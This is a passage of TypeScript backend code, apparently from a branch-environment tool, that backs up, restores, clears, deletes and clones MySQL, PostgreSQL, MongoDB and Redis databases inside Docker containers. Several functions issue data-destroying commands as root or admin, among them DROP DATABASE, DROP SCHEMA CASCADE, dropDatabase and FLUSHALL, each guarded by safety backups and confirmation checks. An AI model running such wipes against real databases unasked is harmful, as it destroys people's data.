      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} ${reason === 'pre-restore' ? '恢复前' : '手动'}备份已生成：${fileName}`,
    });
    return entry;
  }

  function redisConfigValue(output: string, key: string): string {
    const lines = output.split('\n').map((line) => line.trim()).filter(Boolean);
    const index = lines.findIndex((line) => line === key);
    return index >= 0 ? lines[index + 1] || '' : lines[lines.length - 1] || '';
  }

  async function waitForRedisBgsave(service: InfraService): Promise<void> {
    for (let i = 0; i < 120; i += 1) {
      const info = await runRedisCli(service, ['INFO', 'persistence']);
      const active = info.split('\n').some((line) => line.trim() === 'rdb_bgsave_in_progress:1');
      if (!active) return;
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
    throw new Error('Redis BGSAVE 超时');
  }

  async function createRedisBackupFile(params: {
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    reason: 'manual' | 'pre-restore';
  }): Promise<ResourceBackupEntry> {
    const { service, branch, resourceId, resourceName, projectId, actor, reason } = params;
    if (service.status !== 'running') {
      throw new Error(`Redis 服务当前未运行（status=${service.status}）`);
    }
    const dir = resourceBackupDir();
    const fileName = makeResourceBackupFileName({ service, branch, runtime: 'redis', reason });
    const filePath = path.posix.join(dir, fileName);
    await runRedisCli(service, ['BGSAVE']).catch((err) => {
      const message = (err as Error).message;
      if (!/Background saving already in progress/i.test(message)) throw err;
    });
    await waitForRedisBgsave(service);
    const redisDir = redisConfigValue(await runRedisCli(service, ['CONFIG', 'GET', 'dir']), 'dir') || '/data';
    const redisFile = redisConfigValue(await runRedisCli(service, ['CONFIG', 'GET', 'dbfilename']), 'dbfilename') || 'dump.rdb';
    const result = await shell.exec(
      `mkdir -p ${shq(dir)} && docker exec ${shq(service.containerName || '')} cat ${shq(path.posix.join(redisDir, redisFile))} > ${shq(filePath)}`,
      { timeout: 300_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error((result.stderr || result.stdout || 'Redis RDB 备份失败').trim());
    }
    const entry = await statBackupEntry(fileName, 'redis');
    stateService.appendActivityLog(projectId, {
      type: 'resource-backup',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} ${reason === 'pre-restore' ? '恢复前' : '手动'}RDB 备份已生成：${fileName}`,
    });
    return entry;
  }

  async function createResourceBackupFile(params: {
    runtime: ResourceDatabaseRuntime;
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    reason: 'manual' | 'pre-restore';
  }): Promise<ResourceBackupEntry> {
    if (params.runtime === 'mysql') return createMysqlBackupFile(params);
    if (params.runtime === 'postgres') return createPostgresBackupFile(params);
    if (params.runtime === 'mongodb') return createMongoBackupFile(params);
    return createRedisBackupFile(params);
  }

  async function restoreMysqlBackupFile(params: {
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    backupName: string;
  }): Promise<{ backup: string; database: string; safetyBackup: ResourceBackupEntry }> {
    const { service, branch, resourceId, resourceName, projectId, actor, backupName } = params;
    if (service.status !== 'running') {
      throw new Error(`MySQL 服务当前未运行（status=${service.status}）`);
    }
    const database = mysqlDatabaseForBranch(service, branch);
    if (!database || !/^[a-zA-Z0-9_]+$/.test(database)) {
      throw new Error(`数据库名不合法: ${database || '(empty)'}`);
    }
    const { fileName, filePath } = await assertBackupFile(backupName, 'mysql', { service, branch });
    const safetyBackup = await createMysqlBackupFile({
      service,
      branch,
      resourceId,
      resourceName,
      projectId,
      actor,
      reason: 'pre-restore',
    });
    const rootPassword = mysqlRootPassword(service);
    const result = await shell.exec(
      `gunzip -c ${shq(filePath)} | docker exec -i ${shq(service.containerName || '')} mysql -uroot${mysqlPasswordArg(rootPassword)} ${shq(database)}`,
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MySQL 恢复失败').trim(), [rootPassword]));
    }
    stateService.recordDestructiveOp({
      type: 'purge-database',
      projectId,
      mongoDumpPath: safetyBackup.name,
      summary: `恢复 ${resourceName} 到备份 ${fileName}，恢复前备份 ${safetyBackup.name}`,
      triggeredBy: actor,
    });
    stateService.appendActivityLog(projectId, {
      type: 'resource-restore',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} 已从备份 ${fileName} 恢复到 ${database}，恢复前备份 ${safetyBackup.name}`,
    });
    return { backup: fileName, database, safetyBackup };
  }

  async function restoreMysqlBackupIntoBranchDatabase(params: {
    service: InfraService;
    branch: BranchEntry;
    backupName: string;
    targetDatabase: string;
  }): Promise<MysqlBranchDatabaseResult & { backup: string }> {
    const { service, branch, backupName, targetDatabase } = params;
    if (service.status !== 'running') {
      throw new Error(`MySQL 服务当前未运行（status=${service.status}）`);
    }
    if (!targetDatabase || !/^[a-zA-Z0-9_]+$/.test(targetDatabase)) {
      throw new Error(`目标数据库名不合法: ${targetDatabase || '(empty)'}`);
    }
    const { fileName, filePath } = await assertBackupFile(backupName, 'mysql', { service, branch });
    const branchDb = await createMysqlBranchDatabase(service, branch, targetDatabase);
    const rootPassword = mysqlRootPassword(service);
    const result = await shell.exec(
      `gunzip -c ${shq(filePath)} | docker exec -i ${shq(service.containerName || '')} mysql -uroot${mysqlPasswordArg(rootPassword)} ${shq(targetDatabase)}`,
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MySQL 新库恢复失败').trim(), [rootPassword, branchDb.branchPassword]));
    }
    return { ...branchDb, backup: fileName };
  }

  async function assertBackupFile(
    fileNameInput: unknown,
    runtime: ResourceDatabaseRuntime,
    scope: { service: InfraService; branch: BranchEntry },
  ): Promise<{ fileName: string; filePath: string }> {
    const fileName = sanitizeBackupFileName(fileNameInput);
    const ext = resourceBackupExtension(runtime);
    if (!fileName.endsWith(ext)) {
      throw new Error(`当前 ${runtime} 备份只支持 ${ext} 文件`);
    }
    const prefix = `${scope.service.id}-${scope.branch.id}-`;
    if (!fileName.startsWith(prefix)) {
      throw new Error(`备份文件不属于当前资源或分支: ${fileName}`);
    }
    const filePath = path.posix.join(resourceBackupDir(), fileName);
    const exists = await shell.exec(`test -f ${shq(filePath)}`, { timeout: 10_000 });
    if (exists.exitCode !== 0) {
      throw new Error(`备份文件不存在: ${fileName}`);
    }
    return { fileName, filePath };
  }

  async function restorePostgresBackupFile(params: {
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    backupName: string;
  }): Promise<{ backup: string; database: string; safetyBackup: ResourceBackupEntry }> {
    const { service, branch, resourceId, resourceName, projectId, actor, backupName } = params;
    if (service.status !== 'running') {
      throw new Error(`PostgreSQL 服务当前未运行（status=${service.status}）`);
    }
    const database = postgresDatabaseForBranch(service, branch);
    const { fileName, filePath } = await assertBackupFile(backupName, 'postgres', { service, branch });
    const safetyBackup = await createPostgresBackupFile({
      service,
      branch,
      resourceId,
      resourceName,
      projectId,
      actor,
      reason: 'pre-restore',
    });
    const creds = postgresClientCredentials(service, branch);
    const resetSql = 'DROP SCHEMA IF EXISTS public CASCADE; CREATE SCHEMA public; GRANT ALL ON SCHEMA public TO public;';
    const reset = await shell.exec(
      `docker exec -e PGPASSWORD=${shq(creds.password)} ${shq(service.containerName || '')} psql -U ${shq(creds.user)} -d ${shq(database)} -v ON_ERROR_STOP=1 -c ${shq(resetSql)}`,
      { timeout: 120_000 },
    );
    if (reset.exitCode !== 0) {
      throw new Error(maskTextSecrets((reset.stderr || reset.stdout || 'PostgreSQL 恢复前清空 schema 失败').trim(), creds.secrets));
    }
    const result = await shell.exec(
      `gunzip -c ${shq(filePath)} | docker exec -i -e PGPASSWORD=${shq(creds.password)} ${shq(service.containerName || '')} psql -U ${shq(creds.user)} -d ${shq(database)} -v ON_ERROR_STOP=1`,
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'PostgreSQL 恢复失败').trim(), creds.secrets));
    }
    stateService.recordDestructiveOp({
      type: 'purge-database',
      projectId,
      mongoDumpPath: safetyBackup.name,
      summary: `恢复 ${resourceName} 到备份 ${fileName}，恢复前备份 ${safetyBackup.name}`,
      triggeredBy: actor,
    });
    stateService.appendActivityLog(projectId, {
      type: 'resource-restore',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} 已从备份 ${fileName} 恢复到 ${database}，恢复前备份 ${safetyBackup.name}`,
    });
    return { backup: fileName, database, safetyBackup };
  }

  async function restorePostgresBackupIntoBranchDatabase(params: {
    service: InfraService;
    branch: BranchEntry;
    backupName: string;
    targetDatabase: string;
  }): Promise<MysqlConnectionEnvResult & { backup: string }> {
    const { service, branch, backupName, targetDatabase } = params;
    const { fileName, filePath } = await assertBackupFile(backupName, 'postgres', { service, branch });
    const branchDb = await createPostgresBranchDatabase(service, branch, targetDatabase);
    const result = await shell.exec(
      `gunzip -c ${shq(filePath)} | docker exec -i -e PGPASSWORD=${shq(branchDb.branchPassword)} ${shq(service.containerName || '')} psql -U ${shq(branchDb.branchUser)} -d ${shq(targetDatabase)} -v ON_ERROR_STOP=1`,
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'PostgreSQL 新库恢复失败').trim(), [branchDb.branchPassword]));
    }
    return { ...branchDb, backup: fileName };
  }

  async function restoreMongoBackupFile(params: {
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    backupName: string;
  }): Promise<{ backup: string; database: string; safetyBackup: ResourceBackupEntry }> {
    const { service, branch, resourceId, resourceName, projectId, actor, backupName } = params;
    if (service.status !== 'running') {
      throw new Error(`MongoDB 服务当前未运行（status=${service.status}）`);
    }
    const database = mongoDatabaseForBranch(service, branch);
    const { fileName, filePath } = await assertBackupFile(backupName, 'mongodb', { service, branch });
    const safetyBackup = await createMongoBackupFile({
      service,
      branch,
      resourceId,
      resourceName,
      projectId,
      actor,
      reason: 'pre-restore',
    });
    const creds = mongoCredentials(service, branch);
    const result = await shell.exec(
      `docker exec -i ${shq(service.containerName || '')} mongorestore --uri ${shq(creds.uri)} --db ${shq(database)} --archive --gzip --drop < ${shq(filePath)}`,
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MongoDB 恢复失败').trim(), creds.secrets));
    }
    stateService.recordDestructiveOp({
      type: 'purge-database',
      projectId,
      mongoDumpPath: safetyBackup.name,
      summary: `恢复 ${resourceName} 到备份 ${fileName}，恢复前备份 ${safetyBackup.name}`,
      triggeredBy: actor,
    });
    stateService.appendActivityLog(projectId, {
      type: 'resource-restore',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} 已从备份 ${fileName} 恢复到 ${database}，恢复前备份 ${safetyBackup.name}`,
    });
    return { backup: fileName, database, safetyBackup };
  }

  async function restoreMongoBackupIntoBranchDatabase(params: {
    service: InfraService;
    branch: BranchEntry;
    backupName: string;
    targetDatabase: string;
    sourceDatabase: string;
  }): Promise<MysqlConnectionEnvResult & { backup: string }> {
    const { service, branch, backupName, targetDatabase, sourceDatabase } = params;
    const { fileName, filePath } = await assertBackupFile(backupName, 'mongodb', { service, branch });
    const branchDb = await createMongoBranchDatabase(service, branch, targetDatabase);
    const admin = mongoAdminUri(service);
    const result = await shell.exec(
      `docker exec -i ${shq(service.containerName || '')} mongorestore --uri ${shq(admin.uri)} --archive --gzip --drop --nsFrom ${shq(`${sourceDatabase}.*`)} --nsTo ${shq(`${targetDatabase}.*`)} < ${shq(filePath)}`,
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MongoDB 新库恢复失败').trim(), [...admin.secrets, branchDb.branchPassword]));
    }
    return { ...branchDb, backup: fileName };
  }

  async function restoreRedisBackupFile(params: {
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    backupName: string;
  }): Promise<{ backup: string; database: string; safetyBackup: ResourceBackupEntry }> {
    const { service, branch, resourceId, resourceName, projectId, actor, backupName } = params;
    if (service.status !== 'running') {
      throw new Error(`Redis 服务当前未运行（status=${service.status}）`);
    }
    const { fileName, filePath } = await assertBackupFile(backupName, 'redis', { service, branch });
    const safetyBackup = await createRedisBackupFile({
      service,
      branch,
      resourceId,
      resourceName,
      projectId,
      actor,
      reason: 'pre-restore',
    });
    const redisDir = redisConfigValue(await runRedisCli(service, ['CONFIG', 'GET', 'dir']), 'dir') || '/data';
    const redisFile = redisConfigValue(await runRedisCli(service, ['CONFIG', 'GET', 'dbfilename']), 'dbfilename') || 'dump.rdb';
    const targetPath = path.posix.join(redisDir, redisFile);
    const result = await shell.exec(
      `docker cp ${shq(filePath)} ${shq(`${service.containerName || ''}:${targetPath}`)} && docker restart ${shq(service.containerName || '')}`,
      { timeout: 300_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error((result.stderr || result.stdout || 'Redis RDB 恢复失败').trim());
    }
    stateService.recordDestructiveOp({
      type: 'purge-database',
      projectId,
      mongoDumpPath: safetyBackup.name,
      summary: `恢复 ${resourceName} Redis RDB 到 ${fileName}，恢复前备份 ${safetyBackup.name}`,
      triggeredBy: actor,
    });
    stateService.appendActivityLog(projectId, {
      type: 'resource-restore',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} Redis 已从 RDB ${fileName} 恢复并重启，恢复前备份 ${safetyBackup.name}`,
    });
    return { backup: fileName, database: 'redis-rdb', safetyBackup };
  }

  async function restoreResourceBackupFile(params: {
    runtime: ResourceDatabaseRuntime;
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
    backupName: string;
  }): Promise<{ backup: string; database: string; safetyBackup: ResourceBackupEntry }> {
    if (params.runtime === 'mysql') return restoreMysqlBackupFile(params);
    if (params.runtime === 'postgres') return restorePostgresBackupFile(params);
    if (params.runtime === 'mongodb') return restoreMongoBackupFile(params);
    return restoreRedisBackupFile(params);
  }

  async function restoreResourceBackupIntoBranchDatabase(params: {
    runtime: ResourceDatabaseRuntime;
    service: InfraService;
    branch: BranchEntry;
    backupName: string;
    targetDatabase: string;
    sourceDatabase?: string;
  }): Promise<MysqlConnectionEnvResult & { backup: string }> {
    if (params.runtime === 'mysql') return restoreMysqlBackupIntoBranchDatabase(params);
    if (params.runtime === 'postgres') return restorePostgresBackupIntoBranchDatabase(params);
    if (params.runtime === 'mongodb') {
      return restoreMongoBackupIntoBranchDatabase({
        ...params,
        sourceDatabase: params.sourceDatabase || mongoDatabaseForBranch(params.service, params.branch),
      });
    }
    throw new Error('Redis RDB 只能恢复覆盖当前 Redis 实例，不能从备份创建独立新库');
  }

  function acceptedResourceConfirmNames(resource: UnifiedBranchResource): Set<string> {
    const raw = resource.raw as Partial<InfraService>;
    return new Set([resource.displayName, resource.serviceName, raw.id].filter(Boolean) as string[]);
  }

  function ensureResourceNameConfirmed(input: unknown, resource: UnifiedBranchResource, operation: string): void {
    const confirmResourceName = String(input || '').trim();
    if (!acceptedResourceConfirmNames(resource).has(confirmResourceName)) {
      throw new Error(`${operation} 属于危险操作，请输入资源名确认：${resource.displayName}`);
    }
  }

  function removeBranchResourceEnv(runtime: ResourceDatabaseRuntime, branch: BranchEntry): void {
    const keys = runtime === 'mysql'
      ? ['DATABASE_URL', 'MYSQL_URL', 'MYSQL_HOST', 'MYSQL_PORT', 'MYSQL_DATABASE', 'MYSQL_USER', 'MYSQL_PASSWORD']
      : runtime === 'postgres'
        ? ['DATABASE_URL', 'POSTGRES_URL', 'POSTGRES_HOST', 'POSTGRES_PORT', 'POSTGRES_DB', 'POSTGRES_USER', 'POSTGRES_PASSWORD']
        : runtime === 'mongodb'
          ? ['DATABASE_URL', 'MONGODB_URL', 'MONGO_INITDB_DATABASE', 'MONGODB_DATABASE', 'MONGODB_HOST', 'MONGODB_PORT', 'MONGODB_USERNAME', 'MONGODB_PASSWORD', 'MONGODB_AUTH_SOURCE']
          : ['DATABASE_URL', 'REDIS_URL', 'REDIS_HOST', 'REDIS_PORT', 'REDIS_PASSWORD'];
    for (const key of keys) {
      stateService.removeCustomEnvVar(key, branch.id);
    }
  }

  function branchOwnedDatabaseForDelete(runtime: ResourceDatabaseRuntime, service: InfraService, branch: BranchEntry): string {
    const branchEnv = stateService.getCustomEnvScope(branch.id);
    if (runtime === 'mysql') {
      const database = branchEnv.MYSQL_DATABASE || '';
      if (!database || !branchEnv.MYSQL_USER) {
        throw new Error('未检测到分支独立 MySQL 数据库和用户，拒绝删除共享数据库');
      }
      return database.replace(/[^a-zA-Z0-9_]/g, '_').slice(0, 64);
    }
    if (runtime === 'postgres') {
      const database = branchEnv.POSTGRES_DB || '';
      if (!database || !branchEnv.POSTGRES_USER) {
        throw new Error('未检测到分支独立 PostgreSQL 数据库和用户，拒绝删除共享数据库');
      }
      return database.replace(/[^a-zA-Z0-9_]/g, '_').slice(0, 63);
    }
    if (runtime === 'mongodb') {
      const database = branchEnv.MONGODB_DATABASE || branchEnv.MONGO_INITDB_DATABASE || '';
      const env = resolvedInfraEnv(service);
      const serviceRequiresAuth = Boolean(env.MONGO_INITDB_ROOT_USERNAME || env.MONGO_USERNAME || env.MONGODB_USERNAME);
      if (!database || (serviceRequiresAuth && (!branchEnv.MONGODB_USERNAME || !branchEnv.MONGODB_PASSWORD))) {
        throw new Error('未检测到分支独立 MongoDB 数据库和用户，拒绝删除共享数据库');
      }
      return database.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 63);
    }
    throw new Error('Redis 当前是实例级资源，不支持删除为“分支独立数据库”');
  }

  async function clearResourceData(params: {
    runtime: ResourceDatabaseRuntime;
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
  }): Promise<{ database: string; safetyBackup: ResourceBackupEntry }> {
    const { runtime, service, branch, resourceId, resourceName, projectId, actor } = params;
    const safetyBackup = await createResourceBackupFile({ runtime, service, branch, resourceId, resourceName, projectId, actor, reason: 'pre-restore' });
    const database = resourceDatabaseForRuntime(runtime, service, branch) || 'redis-rdb';
    if (runtime === 'mysql') {
      const rootPassword = mysqlRootPassword(service);
      const creds = mysqlClientCredentials(service, branch);
      const sql = [
        `DROP DATABASE IF EXISTS ${sqlIdent(database)}`,
        `CREATE DATABASE ${sqlIdent(database)} CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci`,
        creds.user !== 'root' ? `GRANT ALL PRIVILEGES ON ${sqlIdent(database)}.* TO ${sqlString(creds.user)}@'%'` : '',
        'FLUSH PRIVILEGES',
      ].filter(Boolean).join('; ');
      const result = await shell.exec(
        `docker exec ${shq(service.containerName || '')} mysql -uroot${mysqlPasswordArg(rootPassword)} -e ${shq(sql)}`,
        { timeout: 120_000 },
      );
      if (result.exitCode !== 0) throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MySQL 清空数据失败').trim(), [rootPassword, ...creds.secrets]));
    } else if (runtime === 'postgres') {
      const creds = postgresClientCredentials(service, branch);
      const sql = 'DROP SCHEMA IF EXISTS public CASCADE; CREATE SCHEMA public; GRANT ALL ON SCHEMA public TO public;';
      const result = await shell.exec(
        `docker exec -e PGPASSWORD=${shq(creds.password)} ${shq(service.containerName || '')} psql -U ${shq(creds.user)} -d ${shq(database)} -v ON_ERROR_STOP=1 -c ${shq(sql)}`,
        { timeout: 120_000 },
      );
      if (result.exitCode !== 0) throw new Error(maskTextSecrets((result.stderr || result.stdout || 'PostgreSQL 清空数据失败').trim(), creds.secrets));
    } else if (runtime === 'mongodb') {
      const creds = mongoCredentials(service, branch);
      const result = await shell.exec(
        `docker exec ${shq(service.containerName || '')} mongosh ${shq(creds.uri)} --quiet --eval ${shq('db.dropDatabase()')}`,
        { timeout: 120_000 },
      );
      if (result.exitCode !== 0) throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MongoDB 清空数据失败').trim(), creds.secrets));
    } else {
      await runRedisCli(service, ['FLUSHALL']);
    }
    stateService.recordDestructiveOp({
      type: 'purge-database',
      projectId,
      mongoDumpPath: safetyBackup.name,
      summary: `清空 ${resourceName} 数据，操作前备份 ${safetyBackup.name}`,
      triggeredBy: actor,
    });
    stateService.appendActivityLog(projectId, {
      type: 'resource-restore',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} 数据已清空，操作前备份 ${safetyBackup.name}`,
    });
    return { database, safetyBackup };
  }

  async function deleteBranchDatabaseResource(params: {
    runtime: ResourceDatabaseRuntime;
    service: InfraService;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    projectId: string;
    actor: string;
  }): Promise<{ database: string; safetyBackup: ResourceBackupEntry }> {
    const { runtime, service, branch, resourceId, resourceName, projectId, actor } = params;
    if (runtime === 'redis') {
      throw new Error('Redis 当前是实例级资源，不支持删除为“分支独立数据库”');
    }
    const database = branchOwnedDatabaseForDelete(runtime, service, branch);
    const safetyBackup = await createResourceBackupFile({ runtime, service, branch, resourceId, resourceName, projectId, actor, reason: 'pre-restore' });
    if (runtime === 'mysql') {
      const rootPassword = mysqlRootPassword(service);
      const branchEnv = stateService.getCustomEnvScope(branch.id);
      const user = branchEnv.MYSQL_USER || '';
      const sql = [
        `DROP DATABASE IF EXISTS ${sqlIdent(database)}`,
        user ? `DROP USER IF EXISTS ${sqlString(user)}@'%'` : '',
        'FLUSH PRIVILEGES',
      ].filter(Boolean).join('; ');
      const result = await shell.exec(
        `docker exec ${shq(service.containerName || '')} mysql -uroot${mysqlPasswordArg(rootPassword)} -e ${shq(sql)}`,
        { timeout: 120_000 },
      );
      if (result.exitCode !== 0) throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MySQL 删除数据库失败').trim(), [rootPassword]));
    } else if (runtime === 'postgres') {
      const branchEnv = stateService.getCustomEnvScope(branch.id);
      const user = branchEnv.POSTGRES_USER || '';
      const env = resolvedInfraEnv(service);
      const adminUser = env.POSTGRES_USER || 'postgres';
      const adminPassword = env.POSTGRES_PASSWORD || '';
      const adminDb = env.POSTGRES_DB || adminUser || 'postgres';
      const sql = [
        `SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE datname = ${pgString(database)} AND pid <> pg_backend_pid();`,
        `DROP DATABASE IF EXISTS ${pgIdent(database)};`,
        user ? `DROP ROLE IF EXISTS ${pgIdent(user)};` : '',
      ].filter(Boolean).join('\n');
      const result = await shell.exec(
        `printf %s ${shq(sql)} | docker exec -i -e PGPASSWORD=${shq(adminPassword)} ${shq(service.containerName || '')} psql -U ${shq(adminUser)} -d ${shq(adminDb)} -v ON_ERROR_STOP=1`,
        { timeout: 120_000 },
      );
      if (result.exitCode !== 0) throw new Error(maskTextSecrets((result.stderr || result.stdout || 'PostgreSQL 删除数据库失败').trim(), [adminPassword]));
    } else if (runtime === 'mongodb') {
      const creds = mongoCredentials(service, branch);
      const branchEnv = stateService.getCustomEnvScope(branch.id);
      const user = branchEnv.MONGODB_USERNAME || '';
      const script = [
        'db.dropDatabase();',
        user ? `db.dropUser(${mongoSafeJson(user)});` : '',
      ].filter(Boolean).join(' ');
      const result = await shell.exec(
        `docker exec ${shq(service.containerName || '')} mongosh ${shq(creds.uri)} --quiet --eval ${shq(script)}`,
        { timeout: 120_000 },
      );
      if (result.exitCode !== 0) throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MongoDB 删除数据库失败').trim(), creds.secrets));
    }
    removeBranchResourceEnv(runtime, branch);
    stateService.recordDestructiveOp({
      type: 'purge-database',
      projectId,
      mongoDumpPath: safetyBackup.name,
      summary: `删除 ${resourceName} 分支数据库 ${database}，操作前备份 ${safetyBackup.name}`,
      triggeredBy: actor,
    });
    stateService.appendActivityLog(projectId, {
      type: 'resource-deleted',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName,
      result: 'success',
      note: `${resourceName} 分支数据库 ${database} 已删除，操作前备份 ${safetyBackup.name}`,
    });
    return { database, safetyBackup };
  }

  async function clonePostgresMainIntoBranchDatabase(params: {
    service: InfraService;
    branch: BranchEntry;
    sourceDatabase: string;
    targetDatabase: string;
  }): Promise<MysqlConnectionEnvResult> {
    const { service, branch, sourceDatabase, targetDatabase } = params;
    if (!sourceDatabase || !/^[a-zA-Z0-9_]+$/.test(sourceDatabase)) {
      throw new Error(`源数据库名不合法: ${sourceDatabase || '(empty)'}`);
    }
    if (sourceDatabase === targetDatabase) {
      throw new Error('源数据库与目标数据库相同，拒绝覆盖复制');
    }
    const branchDb = await createPostgresBranchDatabase(service, branch, targetDatabase);
    const env = resolvedInfraEnv(service);
    const adminUser = env.POSTGRES_USER || 'postgres';
    const adminPassword = env.POSTGRES_PASSWORD || '';
    const result = await shell.exec(
      [
        `docker exec -e PGPASSWORD=${shq(adminPassword)} ${shq(service.containerName || '')} pg_dump -U ${shq(adminUser)} -d ${shq(sourceDatabase)} --no-owner --no-privileges`,
        `docker exec -i -e PGPASSWORD=${shq(branchDb.branchPassword)} ${shq(service.containerName || '')} psql -U ${shq(branchDb.branchUser)} -d ${shq(targetDatabase)} -v ON_ERROR_STOP=1`,
      ].join(' | '),
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'PostgreSQL 克隆失败').trim(), [adminPassword, branchDb.branchPassword]));
    }
    return branchDb;
  }

  async function cloneMongoMainIntoBranchDatabase(params: {
    service: InfraService;
    branch: BranchEntry;
    sourceDatabase: string;
    targetDatabase: string;
  }): Promise<MysqlConnectionEnvResult> {
    const { service, branch, sourceDatabase, targetDatabase } = params;
    if (!sourceDatabase || !/^[a-zA-Z0-9_]+$/.test(sourceDatabase)) {
      throw new Error(`源 database 名不合法: ${sourceDatabase || '(empty)'}`);
    }
    if (sourceDatabase === targetDatabase) {
      throw new Error('源 database 与目标 database 相同，拒绝覆盖复制');
    }
    const branchDb = await createMongoBranchDatabase(service, branch, targetDatabase);
    const admin = mongoAdminUri(service);
    const result = await shell.exec(
      [
        `docker exec ${shq(service.containerName || '')} mongodump --uri ${shq(admin.uri)} --db ${shq(sourceDatabase)} --archive --gzip`,
        `docker exec -i ${shq(service.containerName || '')} mongorestore --uri ${shq(admin.uri)} --archive --gzip --drop --nsFrom ${shq(`${sourceDatabase}.*`)} --nsTo ${shq(`${targetDatabase}.*`)}`,
      ].join(' | '),
      { timeout: 1_800_000 },
    );
    if (result.exitCode !== 0) {
      throw new Error(maskTextSecrets((result.stderr || result.stdout || 'MongoDB 克隆失败').trim(), [...admin.secrets, branchDb.branchPassword]));
    }
    return branchDb;
  }

  async function runMysqlCloneMainTask(params: {
    taskId: string;
    projectId: string;
    branch: BranchEntry;
    resourceId: string;
    resourceName: string;
    actor: string;
    service: InfraService;
    sourceDatabase: string;
    targetDatabase: string;
  }): Promise<void> {
    const { taskId, projectId, branch, resourceId, resourceName, actor, service, sourceDatabase, targetDatabase } = params;
    const appendLog = (line: string): string => {
      const task = stateService.getResourceCloneTask(taskId);
      return `${task?.log || ''}\n[${new Date().toISOString()}] ${line}`;
    };
    try {
      stateService.updateResourceCloneTask(taskId, {
        status: 'running',
        progress: 10,
        startedAt: new Date().toISOString(),
        progressMessage: `准备从 ${sourceDatabase} 复制到 ${targetDatabase}`,
        log: appendLog(`started mysqldump clone from ${sourceDatabase} to ${targetDatabase}`),
      });
      stateService.save();

      if (service.status !== 'running') {
        throw new Error(`MySQL 服务当前未运行（status=${service.status}）`);
      }
      if (!sourceDatabase || !/^[a-zA-Z0-9_]+$/.test(sourceDatabase)) {
        throw new Error(`源数据库名不合法: ${sourceDatabase || '(empty)'}`);
      }
      if (sourceDatabase === targetDatabase) {
        throw new Error('源数据库与目标数据库相同，拒绝覆盖复制');
      }

      const branchDb = await createMysqlBranchDatabase(service, branch, targetDatabase);
      stateService.updateResourceCloneTask(taskId, {
        progress: 35,
        progressMessage: '目标库和分支账号已创建，开始导出源库',
        injectedEnv: branchDb.maskedInjectedEnv,
        log: appendLog(`created target database ${targetDatabase} and branch user ${branchDb.branchUser}`),
      });
      stateService.save();

      const rootPassword = mysqlRootPassword(service);
      const mysqlAuth = mysqlPasswordArg(rootPassword);
      const dumpCmd = `mysqldump -uroot${mysqlAuth} --single-transaction --quick --routines --triggers --events ${shq(sourceDatabase)}`;
      const importCmd = `mysql -uroot${mysqlAuth} ${shq(targetDatabase)}`;
      const timeoutRaw = Number(process.env.CDS_MYSQL_CLONE_TIMEOUT_MS || 1_800_000);
      const timeoutMs = Math.max(60_000, Math.min(Number.isFinite(timeoutRaw) ? timeoutRaw : 1_800_000, 3_600_000));
      stateService.updateResourceCloneTask(taskId, {
        progress: 55,
        progressMessage: 'mysqldump 导出中，正在导入目标库',
        log: appendLog('running mysqldump | mysql import'),
      });
      stateService.save();
      const cloneResult = await shell.exec(
        `docker exec ${shq(service.containerName || '')} sh -c ${shq(`${dumpCmd} | ${importCmd}`)}`,
        { timeout: timeoutMs },
      );
      if (cloneResult.exitCode !== 0) {
        throw new Error(maskTextSecrets((cloneResult.stderr || cloneResult.stdout || 'MySQL 克隆导入失败').trim(), [rootPassword, branchDb.branchPassword]));
      }

      injectBranchMysqlEnv(branch, branchDb.injectedEnv);
